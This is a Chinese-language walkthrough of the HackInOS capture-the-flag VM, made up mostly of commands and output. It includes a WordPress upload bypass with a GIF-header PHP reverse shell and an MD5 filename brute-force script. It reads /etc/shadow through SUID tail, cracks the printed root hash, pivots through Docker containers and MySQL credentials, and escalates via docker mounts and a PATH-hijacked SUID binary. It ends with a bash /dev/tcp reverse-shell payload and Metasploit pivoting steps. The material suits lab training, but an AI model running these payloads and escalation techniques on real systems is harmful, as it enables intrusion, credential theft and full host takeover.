VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for 192.168.253.218
Host is up (0.00072s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.218 -p- -A

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.0.3
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 2 disallowed entries 
|_/upload.php /uploads
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blog &#8211; Just another WordPress site

NMAP 输出显示有 2 个端口打开：22(SSH)、8000(HTTP)


--------------------------------------------
--------------------------------------------
3、web信息枚举

访问：
http://192.168.253.218:8000/

发现 Web 服务器上正在运行 WordPress CMS！

dirb http://192.168.253.218:8000/

发现：
http://192.168.253.218:8000/robots.txt

User-agent:*
Disallow:/upload.php
Disallow:/uploads

http://192.168.253.218:8000/upload.php
发现文件上传页面！



--------------------------------------------
--------------------------------------------
4、文件上传+代码审计

打开upload.php 并找到一个可以上传图片的页面。这里我们尝试上传一张图片并得到一张笑脸，看起来这意味着上传文件时出错

查看源代码发现：
<!-- https://github.com/fatihhcelik/Vulnerable-Machine---Hint -->


打开 GitHub 链接，发现里面有 upload.php 文件的源代：

https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
二十七行发现：
	if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){

阅读源码可知只允许上传PNG或GIF格式的图片！


第18~20行：
	$rand_number = rand(1,100);
	$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));

文件被重命名为“md5(<filename><random number)between 1 – 100>的随机数，创建了一个python 脚本，该脚本创建了一个包含所有100个md5文件名的文本文件！
从源码可以看到文件名为md5(basename($_FILES["file"]["name"].$rand_number))加上后缀，也就是.php，rand_number的可能性也就一百零一个，写个脚本爆破一下好了！


第25行：
  $check = getimagesize($_FILES["file"]["tmp_name"]);

绕过getimagesize的限制也比较简单，只要头部伪装成正常PNG或者GIF即可，可以找一个png图片插入php代码，这里我直接在内容的头部加上GIF文件的标识GIF98就好了！



https://github.com/Sayantan5/HackInOS/blob/master/encode.py
----------------------
#!/usr/bin/python
import hashlib
for i in range(100):
      file = "shell.php" + str(i)
      hash = hashlib.md5(file.encode())
      dir = hash.hexdigest() + ".php"
      f = open("dict.txt", "a+")
      f.write(dir+"\r\n")
      f.close()
----------------------


文件上传：
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
修改IP端口、最顶部加入：GIF98


开始爆破：
dirb http://192.168.253.218:8000/uploads/ dict.txt

http://192.168.253.218:8000/uploads/3e04c73ef528d3bcf3bb08b160d340b7.php (CODE:200|SIZE:292)


nc -vlp 7777
http://192.168.253.218:8000/uploads/3e04c73ef528d3bcf3bb08b160d340b7.php

成功获得反弹shell！



--------------------------------------------
--------------------------------------------
5、内部信息收集

python -c "import pty;pty.spawn('/bin/bash')"

curl -O http://192.168.253.138:8081/linpeas.sh

cp ../LinEnum.sh .
curl -O http://192.168.253.138:8081/LinEnum.sh


[-] SUID files:
-rwsr-xr-x 1 root root 68584 Feb 22  2017 /usr/bin/tail

tail -cG /etc/shadow
-c<数目> 显示的字节数

root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::


--------------------------------------------
--------------------------------------------
6、爆破秘钥

john 1
john             (root)


su root
john


--------------------------------------------
--------------------------------------------
7、root信息枚举

通过枚举脚本发现这是docker容器！

[-] ARP history:
252fa8cb1646.experimental_default (172.18.0.4) at 02:42:ac:12:00:04 [ether] on eth0
experimental_db_1.experimental_default (172.18.0.2) at 02:42:ac:12:00:02 [ether] on eth0
localhost (172.18.0.1) at 02:42:cb:76:37:a5 [ether] on eth0

在/var/www/html目录下发现：
cat wp-config.php

 MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'wordpress');

/** MySQL hostname */
define('DB_HOST', 'db:3306');




-rw-rw-rw- 1 root root   28 Feb 28  2019 .port

回到/root目录，找到一个名为“.port”的文件。打开文件并找到寻找其他容器的提示：
Listen to your friends..
7*


--------------------------------------------
--------------------------------------------
8、网段、端口探测

项目十九有枚举过：
查找存活IP：
for i in $(seq 1 255); do ping -c 1 172.18.0.$i; done | grep "bytes from"

64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.035 ms

查找3.4端口：
for i in $(seq 1 65535); do nc -nvz -w 1 172.18.0.4 $i 2>&1; done | grep -v "Connection refused"

(UNKNOWN) [172.18.0.1] 22 (ssh) open
(UNKNOWN) [172.18.0.1] 8000 (?) open
(UNKNOWN) [172.18.0.2] 3306 (mysql) open
(UNKNOWN) [172.18.0.3] 80 (http) open
(UNKNOWN) [172.18.0.4] 2021 (?) open


--------------------------------------------
--------------------------------------------
9、数据库枚举

知道端口 3306 用于 MySQL 服务，我们还有 WordPress 数据库的用户名和密码：


mysql -uwordpress -pwordpress -h 172.18.0.2
show databases;
use wordpress
show tables;  ---发现host_ssh_cred
select * from host_ssh_cred;

获得用户名哈希：
hummingbirdscyber
e10adc3949ba59abbe56e057f20f883e

https://www.somd5.com/
破解获得：123456


--------------------------------------------
--------------------------------------------
10、Docker提权

ssh hummingbirdscyber@192.168.253.218
id
开启了：129(docker)
在hummingbirdscyber权限中输入id可以看到hummingbirdscyber用户属于docker组！


docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
wordpress           latest              69e1f4ea543a        3 years ago         420MB
mysql               5.7                 e47e309f72c8        3 years ago         372MB
ubuntu              latest              47b19964fb50        3 years ago         88.1MB

发现Ubuntu镜像就是我们使用的！有docker权限就能读到/root中的文件了，利用docker run的-v参数，将/root挂载到容器中：

docker run -v /:/root -it ubuntu /bin/bash 
cd /root 
cd root 
cat flag

--------------------------------------------
--------------------------------------------
11、二进制提权

ls -lh $(find / -perm -u=s -type f 2>/dev/null)
find / -perm -4000 2>/dev/null

发现：
/home/hummingbirdscyber/Desktop/a.out

hummingbirdscyber@vulnvm:~$ /home/hummingbirdscyber/Desktop/a.out
root

看到回显root，测试是否能利用提权！

1. 逆向a.out，搞清楚程序具体干了什么
2. 寻找a.out的源文件，搞清楚程序具体干了什么

base64导出文件到本地！

IDA查看源码：
------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setgid(0);
  setuid(0);
  system("whoami");
  return 0;
}
------
a.out内部调用了whoami，于是可以尝试一下命令劫持！

写一个自己的whoami命令，内容为运行一个shell：
------
#include <stdlib.h>
int main(void) {
    system("/bin/bash -p");
    return 0;
}
------
编译它得到可执行文件whoami：

vi whoami.c 
gcc -o whoami whoami.c
chmod +x whoami


查看搜索路径：
echo $PATH
/home/hummingbirdscyber/bin:/home/hummingbirdscyber/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

发现：
/home/hummingbirdscyber/bin

命令劫持：
mkdir bin
mv whoami bin/
which whoami


命令劫持后再运行a.out：
/home/hummingbirdscyber/Desktop/a.out

hummingbirdscyber@vulnvm:~$ /home/hummingbirdscyber/Desktop/a.out
root@vulnvm:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker),1000(hummingbirdscyber)

成功获得root权限！


--------------------------------------------
--------------------------------------------
12、知识拓展

1）MD5随机脚本 php

-----
<?php
for ($i = 1; $i <= 100; $i++){
	echo md5("shell.php" .$i);
	echo "\r\n";
}
-----
然后：
wfuzz -w test.txt --hc 404 http://localhost:8000/uploads/FUZZ.php


2）john针对MD5进行爆破

john -format=RAW-md5 1

3）webshell-payload方法拓展

GIF89a
 <? php exec ( "/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'" ); ?> 


4）MSF思路教学

use exploit/multi/script/web_delivery
setg lhost eth0
setg lport 8888
run
会生成python脚本！


use post/multi/manage/autoroute
set session 1
exploit


use post/multi/gather/ping_sweep
set rhosts 172.18.0.0-255
set session 1
exploit

use auxiliary/scanner/portscan/tcp
set rhosts 172.18.0.0-4
set threads 10
exploit


















